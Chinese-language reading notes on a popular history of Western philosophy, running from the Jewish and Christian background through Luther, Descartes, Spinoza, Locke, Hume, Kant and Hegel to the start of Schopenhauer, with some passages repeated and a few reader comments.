title="上篇：理性的崛起"></a>上篇：理性的崛起</h1><p><strong>基督教与犹太教的区分：</strong>首先是在犹太人中产生了犹太教，而基督教是从犹太教中发展来的。犹太教和基督教都信奉上帝，也都相信会有救世主来拯救他们（“基督”和“弥赛亚”是一个词，都是“救世主”的意思）。区别是，基督教认为救世主就是耶稣，而犹太教不承认耶稣是救世主，他们认为救世主还没有到来。在对待经文上，两者都信奉《旧约》，但只有基督教相信《新约》。《旧约》和《新约》的区别大致在于，一个是记录耶稣降生之前的事，一个是记录之后的事。</p><p>历史上有一个规律，在斗争中，哲学总站在弱者的一方。这是因为哲学讲思辨，讲道理，而只有弱者才会去讲理。强者不需要讲理。</p><p>宗教要求信仰，哲学要求怀疑，两者相悖。</p><p>宗教天生拒斥思考。</p><p>有句俗话叫“能用钱解决的问题都不是问题”，其实还可以说一句话：“必须用暴力解决的问题都是解决不了的问题。</p><p>阿拉伯人并不像后来的基督教十字军那样，对异教徒进行血腥屠戮，而是对占领区的基督徒非常宽待，允许他们保留信仰。唯一的“歧视”是，伊斯兰教徒可以不缴税，而基督徒要缴税。</p><p>不过说来有趣，就在这么无聊的经院哲学时期，却出现了一个对后来的科学发展极为重要的理论。它是一个教士在研究神学的时候提出来的。这个教士因为出生于一个叫作奥卡姆的地方，因此被人称为“奥卡姆的威廉”，这个理论就被后人称为“奥卡姆剃刀”。</p><p>我以为，原因之一在于对宗教的虔诚程度不同。中国人对待宗教有更多实用主义的倾向，信宗教大多是为了要点好处。而且佛教说的是因果报应，就算你不信佛，多做好事也可以有好报。不像基督教讲人有原罪，光做好事没用，你不信仰基督不受洗就进不了天堂。中世纪的教会认为，刚出生的婴儿如果没来得及受洗就夭折了，那也是要下地狱的。<br>中国人拜孔子，是普通的崇拜，并不是当神佛信仰。而且就算是真正的神灵，中国人的崇拜也是马马虎虎的。中国人过年敢用麦芽糖去封灶王爷的嘴，感觉灶王爷就跟胡同口儿那个见谁都打招呼、一下雨就满街喊收衣服的居委会大妈似的，哪有半点上帝的神圣感啊。中国民间还有“泥菩萨过河，自身难保”之类的俗语，直接拿神灵调侃。<br><strong>中国的“两教合一”：</strong>《红楼梦》里，度化女娲的是一僧一道，两人一起行动，一起施法，也不怕俩法术打架；《水浒传》里，和尚老道拜了把子一起去砍人；《西游记》里，道教的玉皇大帝遇到危险叫佛教的如来佛祖过来帮忙。<br><strong>西方宗教火刑由来：</strong>教会还有一个说法：“教会远离血腥。”所以教会不能杀人，把犯人扔给当地政府处罚的时候还要警告官吏，要避免犯人“所有流血及危及生命的可能”。但教会又顺口说了一句，咦，好像火刑不会流血耶。所以你就知道了为什么宗教裁判所的极刑都是火刑了吧。<br><strong>毁灭文化紧跟着杀人：</strong>历史忠实地履行着诗人海涅的那句名言：在他们开始烧书的地方，他们最终会烧人。<br>想减轻罪行吗，可以，裁判所会给你一段时间，让你去检举出更多的异端分子。这一招彻底把这个行业变成了传销，只不过他们要的不是钱，而是良心与鲜血。<br><strong>新教思维的萌动:</strong>说白了，罗马教会认为，外在的行为很重要。而马丁・路德认为，内心的信仰比外在的行为更重要。只要内心真诚信仰上帝就能得救；而是否遵守罗马教会的规定，是否上缴税款，是否完成昂贵的宗教仪式，这些都不重要。<br>因为有了印刷术，欧洲人才有了众多崭新的思想，有了哲学的复兴，有了科学的崛起，有了现代文明的一切：思想自由、理性、怀疑精神、科学、光明的未来。<br><strong>西方宗教的裂变：</strong>路德的影响被越骂越大，再加上各国皇室早就想摆脱罗马教皇的统治和盘剥，宗教革命终于遍及整个欧洲，千百万神父和知识分子卷入其中。几十年后，欧洲支持路德和罗马的两派贵族还打了一场惨烈的宗教战争。双方打了个势均力敌。从此，欧洲基督教分成了两大派：罗马一方被称为天主教；路德一方被称为新教。另外，东边的罗马帝国在此之前还搞了一个东正教。 天主教、新教、东正教，这就是今天基督教最主要的三大教派。新教的诞生全仰仗路德的努力。<br>一言兴邦，这个千百万文人的终极梦想，路德做到了。<br>俗话说“牛打江山马坐殿”。革命的理论者和掌权者常常不是同一个人。就像卢梭成就了罗伯斯庇尔，路德成就的是加尔文。</p><p>而<strong>怀疑是思考的起点</strong>，也是思考成果的检验者。怀疑的最大作用在于能避免独断论，这样才能引导我们寻找正确的答案，免得我们轻信一切未经证实的东西。<br>所以我们才能明白，为什么当年的苏格拉底那么招人讨厌，却能被后人奉为圣贤。因为他的怀疑是理性文明的开端和标尺。所有的思想都要因他的怀疑而诞生，最后还要能经得住他的怀疑才算合格。正是照着这个标准思考，<strong>西方人才有了哲学，才有了科学，才创造了现代文明。</strong></p><p>苏格拉底$\to$柏拉图$\to$亚里士多德$\to$亚里士多德$\to$亚历山大</p><p><strong>犹太教和基督教的关系</strong></p><p>犹太人中诞生犹太教，基督教是从犹太教发展来的。都信奉上帝，都相信会有救世主来拯救他们（“基督”和“弥赛亚”是一个词，都是救世主的意思）。</p><div class="table-container"><table><thead><tr><th style="text-align:left">犹太教</th><th style="text-align:left">基督教</th></tr></thead><tbody><tr><td style="text-align:left">犹太人产生</td><td style="text-align:left">从犹太教产生</td></tr><tr><td style="text-align:left">不承认耶稣是救世主，认为救世主还没来</td><td style="text-align:left">认为救世主就是耶稣</td></tr><tr><td style="text-align:left">信奉《旧约》</td><td style="text-align:left">信奉《旧约》《新约》：区别是记录耶稣降生之前和之后的事情</td></tr></tbody></table></div><p>特殊人物：保罗</p><p>　　拥有罗马公民身份。早年保罗是犹太教徒，积极迫害基督徒。《使徒行传》记载，保罗在追捕耶稣门徒的路上突见耶稣显灵，从这天起，保罗从迫害者转变成虔诚的基督徒。他的皈依对基督教即为重要。<br>　　他做的最重要的事是：向犹太人以外的民族传播基督教。他的武器就是希腊哲学。他撰写大量神学文章称作《保罗新书》，后来成为《新约》的重要组成部分。<br>——此时哲学称为<strong>教父哲学</strong>。</p><p><strong>经院哲学</strong>——集大成者托马斯·阿奎纳</p><p><strong>马丁·路德</strong></p><p>罗马一方称为天主教，路德一方称为新教，东边罗马帝国还有个东正教。</p><p><strong>笛卡尔——我思故我在</strong></p><p>　　只要有了怀疑的念头，就说明“我”肯定是存在的-“我”要是不存在就不会有这些年念头了。</p><p>　　“我思”和“我在”不是因果关系，而是推理样衣关系，即：从前者为真可以推导出后者为真。也就是从“我思”为真，可以推导出“我在”为真。而不是说“我不思”的时候就“我不在”了，在不在我们不知道。</p><p><strong>形而上学</strong></p><p>追问这个世界的本质：世界的本质是物质的还是精神的？解释的本质是物理定律还是我们对物理定律的信念？</p><p>回答这些问题都是形而上学的问题：</p><p>“世界本质是什么”的问题：在哲学里称作“本体论”。</p><p>“哪些知识是真实可信”的问题：在哲学里又称作“认识论”。</p><p><strong>二元论</strong>：心灵一个元，外界一个元。这两个元是互相独立的、平等的，虽然可以互相影响，但谁也不能完全决定另外一个。</p><p>从二元论的角度说，他人对我们的评价和我们的精神世界无关，我们可以完全忽视。但是对于我们在乎的人，这点事极难做到的。一旦做到了，我们也就成了完全不关心任何人的冷血动物。<br>实际上，当我们在乎外人的感受时，就相当于我们把自己的喜怒哀乐寄托于外物，我们即不可能控制一切外物，也不可能让他人的感受总符合我们的意愿。因此不仅仅是二元论，其他自我安慰的手段对于我们说关心的人都有些束手无策。</p><p>反对二元论：唯物主义：说世界的本质是物质的，我们精神世界不过是大脑生理活动的结果。换句话说，精神是从物质中产生的。这种观点叫做物质一元论。</p><p>同时有唯心主义一元论，认为世界的本质是精神的，外面世界不过是自己心灵的产物。</p><p>从二元论进一步得到唯我论。：假设我们只停留在“我在”的阶段，我们只能确认我自己的存在，外界一切存在不存在我不知道，这叫做“唯我论”。</p><p>“唯我论”还可以和目的论结合在一起。：就是认为世间万物是因为某种目的而存在的。</p><p>但是唯我论和目的论能赋予人生一种特殊的美。能给与我们一个理解人生的全新视角。</p><p><strong>斯宾诺莎</strong>：他是笛卡尔的继承者。：按照欧式几何学的模式来建立哲学体系：具体来说，就是先找出一些不言自明的公社，再以这些公社为基础，按照演绎推理的方法建立整个哲学体系。</p><p>他的观点：<strong>实体</strong>的特征是自己就是机制存在的原因，不依赖外物存在。意味着，外物也不可能摧毁实体。推出实体肯定是永远存在的。实体是无限的、是唯一的、不可分的、是善的。</p><p>科学靠归纳法搞研究。事实上，我们今天取得的所有科学成就，都是综合使用归纳法和演绎推理的结果。</p><p>科学派哲学家：洛克：“儿童心灵是白纸”也承认人的本能是天生的。</p><p>笛卡尔、斯宾诺莎代表的数学派，被称为“理性主义”。</p><p>洛克代表的科学家被称为“经验主义”。</p><div class="table-container"><table><thead><tr><th style="text-align:left">理论名称</th><th>理性主义</th><th style="text-align:left">经验主义</th></tr></thead><tbody><tr><td style="text-align:left">代表人物</td><td>数学派哲学家</td><td style="text-align:left">科学派哲学家</td></tr><tr><td style="text-align:left">研究方法</td><td>演绎法</td><td style="text-align:left">归纳法</td></tr><tr><td style="text-align:left">优点</td><td>严谨</td><td style="text-align:left">产生新知识</td></tr><tr><td style="text-align:left">缺点</td><td>不产生新知识，公社未必可靠</td><td style="text-align:left">结论不能保证绝对正确，永远有出错的可能</td></tr></tbody></table></div><p>用一个比喻来描述两个学派的特点：</p><ul><li><p>假如哲学是一座通向终极定理的巴别塔的话，那么理性主义者的塔高耸入云，每搭建一次，都似乎马上可以触摸到天堂。但是这座塔的根基却是几根木头，经验主义者们经常来溜达，随便踹上几脚，这座塔就塌了。</p></li><li><p>经验主义不同，他们的塔盖得极为结实。但是由于能力有限，他们只能零零散散地在各地建造一些矮塔，这些塔既连不到一块，又没法盖得很高。因此经验主义者们的塔虽然结实，却根本没法满足人类的要求，盖得再多也没有用。</p></li></ul><p><strong>新教思维的萌动:</strong>说白了，罗马教会认为，外在的行为很重要。而马丁・路德认为，内心的信仰比外在的行为更重要。只要内心真诚信仰上帝就能得救；而是否遵守罗马教会的规定，是否上缴税款，是否完成昂贵的宗教仪式，这些都不重要。<br>因为有了印刷术，欧洲人才有了众多崭新的思想，有了哲学的复兴，有了科学的崛起，有了现代文明的一切：思想自由、理性、怀疑精神、科学、光明的未来。<br><strong>西方宗教的裂变：</strong>路德的影响被越骂越大，再加上各国皇室早就想摆脱罗马教皇的统治和盘剥，宗教革命终于遍及整个欧洲，千百万神父和知识分子卷入其中。几十年后，欧洲支持路德和罗马的两派贵族还打了一场惨烈的宗教战争。双方打了个势均力敌。从此，欧洲基督教分成了两大派：罗马一方被称为天主教；路德一方被称为新教。另外，东边的罗马帝国在此之前还搞了一个东正教。 天主教、新教、东正教，这就是今天基督教最主要的三大教派。新教的诞生全仰仗路德的努力。<br>一言兴邦，这个千百万文人的终极梦想，路德做到了。<br>俗话说“牛打江山马坐殿”。革命的理论者和掌权者常常不是同一个人。就像卢梭成就了罗伯斯庇尔，路德成就的是加尔文。<br>而<strong>怀疑是思考的起点</strong>，也是思考成果的检验者。怀疑的最大作用在于能避免独断论，这样才能引导我们寻找正确的答案，免得我们轻信一切未经证实的东西。<br>所以我们才能明白，为什么当年的苏格拉底那么招人讨厌，却能被后人奉为圣贤。因为他的怀疑是理性文明的开端和标尺。所有的思想都要因他的怀疑而诞生，最后还要能经得住他的怀疑才算合格。正是照着这个标准思考，<strong>西方人才有了哲学，才有了科学，才创造了现代文明。</strong></p><p><strong>笛卡尔的观点</strong>“我思”和“我在”不是因果关系，而是推理演绎的关系。即：从前者为真可以推导出后者为真。也就是从“我思”为真，可以推导出“我在”为真。而不是说“我不思”的时候就“我不在”了，在不在我们不知道。从“我思故我在”开始，西方哲学的精妙之处可见一斑。</p><p><strong>欧几里得第五公设：</strong>咱们来看看剩下的第五公设。内容是：若两条直线都与第三条直线相交，并且在同一边的内角之和小于两个直角，则这两条直线在这一边必定相交。事实上，由于欧几里得的成就实在是太令人着迷了，公设加推理演绎的研究思想影响了当时整个欧洲的思想界。近代西方法学家们喜欢讲的“天赋人权”、《独立宣言》中讲的“我们认为以下真理不言而喻”，这些都是典型的公设，不需要解释，应无条件承认。然后其他的结论再从这些公设中推导出来。</p><p><strong>“形而上学”：</strong>可以简单地理解成是用理性思维去研究那些能统一世间一切问题的“大道理”。就像笛卡尔希望的那样，要寻找到一个能高于客观世界、统领一切事物的真理。比如世界的本质是什么样子的啊、人生的意义是什么啊之类的问题。</p><p><em>加缪说过：“真正严肃的哲学问题只有一个，那就是自杀。”研究“人为什么不自杀”，其实就是在研究“人为什么活着”。</em></p><p>“世界的本质是什么”的问题，在哲学里又称作<strong>“本体论”</strong>。“哪些知识是真实可信”的问题，在哲学里又称作<strong>“认识论”</strong>。</p><p>　　二元论能帮助我们的关键是：我们在自己的精神世界里是无敌的，而一切体验归根到底都是精神体验。<br>　　而在二元论的观念下，世界被一分为二：外界和内心。痛苦虽然来自于外界，但真正承受痛苦的是我的内心。因此我们虽然仍旧需要尽力去改变外物，但在客观世界这一元里的得失其实不重要，关键是固守自己的内心这一元，固守住我们获得体验的最后一关。而在内心世界里，我们自己能完全做主，这就让人产生了很大的安全感。</p><p>　　我们想，对人伤害最大的其实不是一时的痛苦，而是对未来痛苦的恐惧。这就像打针对于孩子来说，可怕的地方在于排队，在于来苏水味、叮叮当当的针管以及胳膊上的凉意。真正的肉体疼痛与此相比微不足道。我们怕穷，并不是因为我们不能忍受粗糙的吃穿，而是因为不愿意整日生活在对贫穷的恐惧和屈辱中。我们不愿意忍受的是那种担惊受怕的状态。所以，在面对痛苦的时候，我们应该把自己的感受局限在此时一瞬，而不要顾及那些未到的痛苦。<br>　　<br>　　从二元论的角度说，他人对我们的评价和我们的精神世界无关，我们可以完全忽视。但是对于我们在乎的人，这点是极难做到的。一旦做到了，我们也就成了完全不关心任何人的冷血动物。实际上，当我们在乎外人感受的时候，就相当于我们把自己的喜怒哀乐寄托于外物。我们既不可能控制一切外物，也不可能让他人的感受总符合我们的意愿。因此不仅是二元论，其他自我安慰的手段，对于我们所关心的人都有些束手无策。<br>　　<br>　　张爱玲的短篇小说《倾城之恋》里，已经是明日黄花的女主人公本想靠情场手腕俘虏男主人公，怎奈技不如人，眼看就要错失良婿，这时日军突然向香港开战。在战火中，男女主人公同生共死，得以终成眷属。此时张爱玲写道：“香港的陷落成全了她⋯⋯谁知道呢，也许就因为要成全她，一个大都市倾覆了。”这段话是典型的<strong>唯我论和目的论。</strong><br>　　<br>　　不光勇敢，笛卡尔还很有风度，据说有个人因为争抢女人要找他决斗。笛卡尔只说了一句话，就消除了那情敌的敌意。笛卡尔对他说的是：“你的生命不应该献给我，应该献给那位夫人。”</p><p>　　笛卡尔说过：“不管多么荒谬、多么不可置信的事，无一不是这个或那个哲学家主张过的。”</p><p><strong>斯宾诺莎</strong>最有影响的著作叫《伦理学》，在他去世后才发表。这本书的全称是《按几何顺序证明的伦理学》。<br>　　当斯宾诺莎意识到自己的幸福应该通过理性思考来追求的时候，他发现，在得出最终答案之前还需要很长时间。那么在这段时间里，自己该怎么生活呢？他总结了几个可以暂时执行的原则，大意是： <strong>第一，说话要尽量让别人明白，只要别人对我们的要求不会影响我们实现自己的目标（比如求知），那就尽量满足。 第二，只享受为保持健康所必需的生活乐趣。第三，只求取为生活和健康所必需的金钱。</strong> 这些生活准则并非出于斯宾诺莎的哲学思考，而是他以一个普通人的身份、一个立志求知者的身份思考出来的。这些结论平实朴素，完全就是心灵鸡汤的标准素材。<br>　　<br><strong>培根</strong>强调要重视事实。而在事实的基础上进一步形成科学知识，就要靠归纳法了。归纳法的意思是，人们通过观察多个个别的现象，总结出普遍的规律。比如人观察到，每一次把石头扔出去，最后石头总要落地。那么他就能总结出“空中的石头总会落地”这么条规律来。<strong>事实上，我们今天取得的所有科学成就，都是综合使用归纳法和演绎推理的结果。</strong></p><p>　　由于这场争论是哲学界的一件大事，所以哲学家们给这两派学说分别起了名字。笛卡尔、斯宾诺莎代表的数学家派，被称为“理性主义”。 在归纳法里，最重要的是实验数据，是观测结果，它们是科学理论的基础和证据。这些东西可以用一个词来统称：经验。所以洛克代表的科学家派被称为“经验主义”。<br>　　就说理性主义和经验主义之间的分歧吧，其实可以上溯到柏拉图和亚里士多德的分歧。他们俩对世界的看法就不一样。<strong>一个重视心灵理性，一个重视现实经验。</strong><br>　　洛克说，理性主义者们所谓的一些先于经验的公设啊，理念啊，和动物的本能没有区别。莱布尼茨针锋相对地反驳：你知道<strong>人跟禽兽有什么区别吗？区别就是禽兽做事只凭经验，人却能根据经验总结出必然规律。禽兽不知道思考，总以为过去发生的事情，在以后相似的场合下还会发生。所以人可以利用禽兽的习性，去设计陷阱捕捉禽兽。而你们这帮经验主义者，你们只强调经验，不承认必然规律，那你们的联想能力不就跟禽兽一样了吗？</strong> 话说得可真狠啊！ 但应该强调的是，在论战中，莱布尼茨是非常有风度的。他把自己和洛克辩论的书信集结成了一本《人类理智新论》。但是当这本书写成的时候，洛克已经去世了。莱布尼茨认为对手不能答辩了，自己发表和他的辩论是不公平的，于是在自己生前一直藏着这本书没有发表。当然，除了要灭洛克之外，莱布尼茨还有自己的哲学成果，我们也简单说一下。</p><p><strong>莱布尼茨</strong>的公设是这样的：物质是占据空间的对吧？那么只要是能占据空间的东西，就可以被分成更小、更简单的东西。 物质无限地分下去，最后剩下的，一定是不占据空间的“东西”——要是占据空间就能再分下去了。这“东西”不占据空间，所以它不是物质。所以它是精神。 所以一切物质都是由精神组成的。</p><p><strong>牛顿</strong>，旷世天才，伟大的物理学家、数学家、天文学家、哲学家、神学家、炼金术士、小心眼儿、世界末日预测者。——对，你没听错，牛顿晚年通过复杂的公式，计算出了世界末日的具体时间，就在2060年。</p><p><strong>正确并且要简单：</strong>简单地说，我们衡量某个学说、理论、定理是不是好用，<strong>有两个标准：第一看它能否准确地预测未来，第二看它是否足够简要。</strong></p><p>第二个标准，就是一套理论在保持准确性的前提下，越简练越好。<strong>我们今天都接受“日心说”，知道地球绕着太阳公转，同时地球自己还自转。但是不要忘了，运动都是相对的啊。假如我们以地球为静止不动的宇宙中心，我们同样可以描绘出太阳等星球相对于地球的运动轨道来，同样可以符合天文现象。这不就成了“地心说”了吗？之所以我们没选择“地心说”而选择了“日心说”，并不是因为前者不准确，而是因为在两者同样准确的前提下，“日心说”更加简洁。在哥白尼之前的时代，坚持“地心说”的天文学家们为了让理论能和观测结果符合，不得不给太阳等星球画出非常复杂的轨道来。比如让太阳在一个大圆周运动上再做小圆周运动，就像螺旋一样。如果他们按照观测结果不断地修正理论，那么这套“地心说”学说有一天也可以和“日心说”理论一样准确。但是模型和计算过程就无比复杂了。</strong></p><p>这里存在疑问，为什么不是说因为是无线接近真相而相信而是说因为简单，我觉得这里作者理解有误。</p><p>用物理学来解释包括人类意识在内的整个世界，这种观点就叫作<strong>“机械论”</strong>。</p><p><strong>机械论</strong>很好理解，我们在学校的时候都受过辩证唯物主义的训练。<strong>机械论就是除掉了辩证法之后的唯物主义，也可以叫作“机械唯物主义”。</strong></p><p>机械论虽然可以条理清晰地解释这个世界，但是按照机械论的说法，人类不过是这个世界中可有可无的一件事物而已，和桌子板凳、花鸟鱼虫没有本质的区别。我们的意识不过是一系列物质作用的结果，随时可以消失，毫无永存的希望，更谈不上还有什么人生意义。就像世间的其他事物一样，存在就存在了，消失就消失了。这很容易推导出虚无主义和享乐主义。但这还不是最可怕的，最可怕的是这个： <strong>决定论。</strong> 决定论的意思很简单，既然世间万物都可以用物理规律来解释，那么每一个事件之间必然要遵循严格的因果关系。如果人的意识是完全由物质决定的，那肯定也得服从严格的物理定律。那么，整个世界该如何发展，该走向何处，都是由自然定律决定好了的。就像人们根据力学可以预测星辰位置一样，人们也可以根据自然规律来预测未来所有的事件。</p><p>　　中国人很狡猾，遇到好事的时候就不说是“命”了，男女相聚，说的是“缘”。缘是什么？佛教概念里讲的是因果报应。<strong>遇到好事讲“缘”</strong>，意思就是说这是因为我之前做过什么好事，这是我应得的。但自己遇到坏事就像前面说的，不讲因果改讲宿命论。但等到讨厌的人遇到坏事呢，就又是因果了，骂人家这是“报应”，这是“活该”。那么，要是自己讨厌的人遇到好事了，中国人怎么办呢？多半心中暗骂：某某某你等着，三十年河东三十年河西，谁笑到最后谁笑得最好——他又开始讲辩证法</p><p><strong>休谟</strong>想，有什么知识是切实可信的呢？他找到两种。 第一种是不依赖于经验的知识。比如几何学，它自身是不矛盾的，完全符合逻辑规则，而且不依赖经验存在。我们前面说过，在现实世界中观察不到任何严格的三角形，但是我们仍旧有三角形这个概念。三角形不依赖外物存在。自然，像斯宾诺莎、莱布尼茨这些人的哲学体系，因为根基是可疑的，所以不在休谟的承认之列。 第二种可靠的知识是我们自己感受到的经验，摸到什么、看到什么，这些都是可信的（当然，还是那句话，这经验是不是来自于幻觉我们先不管）。休谟想来想去，觉得可信的知识就这两种，于是他很彪悍地说了一段话：<strong>我们去图书馆随便拿起一本书，问这些书中包含着数和量的抽象推论吗？包含着关于实在事实和存在的任何经验的推论吗？如果都没有，就可以烧掉，因为里面只有诡辩和幻想。</strong></p><p><strong>相关性与因果性：</strong>举个简单的例子，假如有一个没有科学知识的原始人，他通过观察发现，公鸡打鸣之后，总伴随着太阳升起，没有一天例外。那么他会认为，公鸡打鸣是太阳升起的原因。这显然是错的。</p><p><strong>归纳法的弊端：</strong>罗素有一个比喻，说假设农场里有一只鸡，每次一看到农场主来，就被喂食物，那么这只鸡就会以为农场主和给它喂食之间有因果联系。但结果有一天，农场主带来的不是鸡食而是一把猎枪，农夫把鸡杀了。换句话说，鸡通过观察发现，农夫和喂食这两件事总在一起发生，便以为其中有因果关系。但实际上，耗费它毕生时间得到的观察结果，仍旧不能证明这两件事之间有必然联系或者因果关系。<br><strong>统计学上有一句经典的话，“相关性不代表因果性”。</strong><br>实际上，我们生活中常常遇到类似不靠谱的结论。比如因为“少年犯中80%的人都玩网络游戏”，就得出结论，说“玩网络游戏会导致青少年犯罪”。那“100%的少年犯每天都吃饭”该怎么解释？<br>在因果律问题的两端，一边是没有因果律，那科学就完蛋了；一边是有因果律，但就会没有了自由和道德。你说你相信哪个？两个都不好受。<br><strong>关于伽利略的“两个铁球同时落地”：</strong>这个实验结果也是错的。因为虽然两个球受到的空气阻力是一样的，但是两个球受到的重力不同，用重力减去相同空气阻力得到的合力，不再和各自的质量成正比，所以实际的加速度也是不同的。只要学过初中物理，列个式子就明白了。<br><strong>人人都信基督教：</strong>我们读过的课本里讲科学史的时候，常常把科学家和教会当成不共戴天的敌人一个无比光辉、一个反动透顶。实际上在那个年代，别说科学家了，连那些被烧死的异端算一块儿，几乎每个人都信基督教，而且不少人还无比虔诚。什么哥白尼、伽利略、牛顿，全是基督徒。拉美特里那样的才是真正的特例。<br><strong>德国哲学“梦之队”：</strong>包括康德，以及后面的谢林、黑格尔、费尔巴哈、叔本华、尼采、马克思、胡塞尔、海德格尔，还有对哲学影响颇大的爱因斯坦、海森堡①。这个超豪华阵容全部都是德意志人。他们中有不少是犹太人。后来希特勒迫害犹太人，致使一堆超级智囊人士脱离德国国籍到英美去作贡献了。德国古典哲学的一个共同特点是晦涩难懂，不只是康德，德国哲学家全这德行。<br><strong>康德：</strong>在这个世界里，人类是一种非常可怜的生物。人类永远无法认识到这个世界的真面目。人类所感受到的这个世界，都是通过人类心灵中某个特殊的机制加工处理过的。这个负责加工的机制，我们起个名字叫作“先天认识形式”。 <strong>世界的真面目，起个名字叫“物自体”（也被译作“自在之物”）。 人类感觉到的世界，也就是“物自体”经过“先天认识形式”加工后得到的东西，我们把他（们）叫作“表象”。</strong></p><p>在康德的哲学世界里，所有的知识（也就是来自于物自体的知识）都要先经过人类心灵的加工，才能被人类认识。所以他自比哲学界的哥白尼，在他的哲学里，不是心灵去感受经验，而是心灵加工经验，心灵生产了经验。当然，这加工过程并不是任意的。</p><p>这个比喻说，假设每个人终身都必须戴着一副蓝色的有色眼镜。这个世界上所有的事物，必须都通过有色眼镜的过滤才能被人看到。那么所有人看到的就是一个蓝色的世界，而世界真实的面貌是人永远看不到的。在这个比喻里，<strong>有色眼镜是先天认识形式，事物原本的颜色是物自体，人类看到的蓝色的世界，是表象。</strong></p><p>换句话说，康德让人的意志受到了先天认识形式的严密保护，因果律不能穿透先天认识形式去控制人的内心意志，所以人仍旧是自由的。</p><p><strong>所谓“二律背反”，</strong>就是一些关于“空间是不是有限”之类的形而上学问题。康德一一讨论这些问题，发现这些问题无论是证明为真还是为假，都是成立的。换句话说，要靠理性去研究这些命题，得出的都会是自我矛盾的答案。康德认为，这背后的原因就是，这些命题讨论的内容不在表象世界中，而是属于物自体的世界，是我们的理性无法认识的。如果我们非要用理性去讨论，就会出现这种自我矛盾的情况。这也就是为什么不同的理性主义者研究这些问题会得出相反结论的原因。</p><p>康德的解决方法是，他把世界分成了两个部分。一个部分完全不可知，另一个部分则可以用理性把握。不可知的那部分因为永远不可知，所以对我们的生活没有什么影响。只要我们在可把握的世界里生活，理性就又恢复了威力。这样，既没有破坏休谟的理论（想破坏也没那能力），又让人类重新信任理性，重新踏实了。 康德的学说并不是和我们完全无关的玄学，而是有很重要的现实意义。 假如我们接受康德的世界观，我们就同意，这世上总有一些东西是我们无法认识的。我们只要安于在能认识的世界里生活就对了。<br>所以，我们说，如果一个人做好事是为了得到表扬，在康德这里就不算道德。这让我们想起了孟子说过的“恻隐之心，人皆有之”。孟子说你遇到一个小孩掉井里了，你救他，不是因为你认识他的父母，不是因为你想受表扬，让你救他的，是你心中的<strong>道德情感。</strong>孟子和康德一样，都认为道德是先天的。</p><p>用<strong>叔本华</strong>的话说，任何人在读懂康德之前都只是一个孩子。</p><p><strong>黑格尔</strong>：可以打一个比方，哲学家们的工作情形就好比有一块大石头，叫作“理性”，哲学家们打算去研究这玩意儿了。但哲学家们唯一能用的工具也只能是“理性”。黑格尔之前的哲学家们，用手中的理性工具去钻研面前的理性石头，一番努力之后，面前的理性石头变了模样。最终，哲学家们看着石头，抹抹头上的汗说：“我的工作完成了，我终于发现终极真理了！”但是这帮哲学家们都忘了，眼前的理性石头变样后，他手里的理性工具也随之变样了！</p><p>我们今天对辩证法有一种庸俗的理解，说辩证法就是“看待事物要分两个方面”。别人批评一个现象，你非要说“要辩证地看这件事，这件事也有好的一面嘛”。这是对辩证法的极大误读。这不叫辩证法，这叫诡辩法，它的唯一作用是把所有的事实都捣成一片糨糊，逃避一切有意义的结论。</p><p>黑格尔说，一个判断并不是世界的永恒真相。他认为，世界不是容不得矛盾的，而恰恰相反，到处都是矛盾，矛盾就是世界的本质。<br>因此黑格尔认为，事物是不断变化的，这种变化是自发的、抑制不住的。同时，这种变化不是无序的，而是有方向的，这个方向就是较低级的正题和反题不断变成更高级的合题，也就是事物不断在向高级形态变化。 变化到最后是什么呢？ 就是黑格尔的终极真理，黑格尔给它起个名字，叫做“<strong>绝对精神”。</strong></p><p>因为重视历史过程，黑格尔是第一个重视研究哲学史的人。今天人们学西方哲学的时候，公认最好的办法是先读一本《西方哲学史》才有资格再谈别的，这个风气就是从黑格尔开始的。</p><p>我们知道，黑格尔的历史观后来被马克思批判性地继承，变成了辩证唯物主义历史观——马克思也认为，历史的进程是有方向的，不可逆转、不可阻止的，但是可以预测的。<br><strong>马克思</strong>预测历史通向的是共产主义，那么黑格尔的历史通向哪里呢？黑格尔的历史通向绝对精神。他认为宗教比自然科学更高级，哲学又比宗教高级。最后，绝对精神会通过哲学完成自己的发展，达到最完美的境界。</p><p>形而上学到了黑格尔这里，变得史无前例的庞大。黑格尔用理性建造了一座宏伟的形而上学大厦，囊括了世间万物，实现了形而上学家们多年以来的终极梦想。所以我们说，<strong>黑格尔是形而上学的巅峰。</strong></p><p><strong>辩证法：</strong>再庸俗地解读一下辩证法。黑格尔认为世界一切事物的发展都要符合辩证法，这个看法太教条了。但有时辩证性的确有道理。 比如，一个人是怎么成长的呢？一个人先有一个原有的思想（正题），然后在生活中遇到了这思想不能解决的问题（反题），思想和现实问题发生了冲突，才会引起他反思人生。这个反思的结果不可能说最后完全不顾以前的旧想法（正题），最后的新思想（合题）肯定是结合了正题和反题。这就代表着人变得更成熟了。</p><p>小资情调的文章会说，<strong>男女之间最悲凉的关系不是憎恨，而是淡漠。</strong>因为如果你恨，就意味着你对伴侣还有很深的感情。——在这里，憎恨是正题。光看正题，我们会觉得这两个人的关系已经差到极点了，差到负数了。但如果我们通过这个正题去找它的反题，会发现，憎恨的原因是受过深深的伤害。受过深深的伤害是因为曾经非常在乎。还憎恨，就说明心结还没有打开，还在乎对方。这就是《苦月亮》等爱情故事的逻辑基础。</p><p>再比如，您应该会同意，我们追求个人幸福的最高境界并不是有钱有权有一大堆情人围着，并不是肉体享乐。哲学史上也没有哪个哲学家认为纵欲是快乐之道。连古希腊的享乐主义者追求的也不是肉欲的极限，而是适度的享乐、劳逸结合的生活。<strong>这是因为大家都发现一个问题，肉欲快乐固然很好，但是纵欲总是和它的反题——痛苦、空虚紧紧连在一起的。不存在某种只给人快乐、不带来痛苦的享乐。这正符合了辩证法的观点。所以最后的结论就是，我们追求个人幸福的最高境界，不是纵欲，而是内心的平静。</strong></p><p>此时的叔本华不仅在生活上独立了，在哲学的道路上也有了自己的看法。他崇拜康德鄙视黑格尔。就像我们前面说的，他觉得黑格尔是欺世盗名的骗子。</p><p><strong>“生命意志”</strong>这个词呢，在叔本华的理论中有专门的意思，跟我们平时聊天时的含义不同。我们在谈叔本华哲学的时候，大多就直接写“生命意志”或者“意志”、但请记住这是一个专有名词，不要按照字面意思去理解。</p><p><strong>那么生命意志是个什么东西呢？</strong>简单地说，是一股永不停歇的力量。这股力量驱使着万物去运动，去发展。 比如人和动物的食欲性欲，比如植物破土而出的欲望。 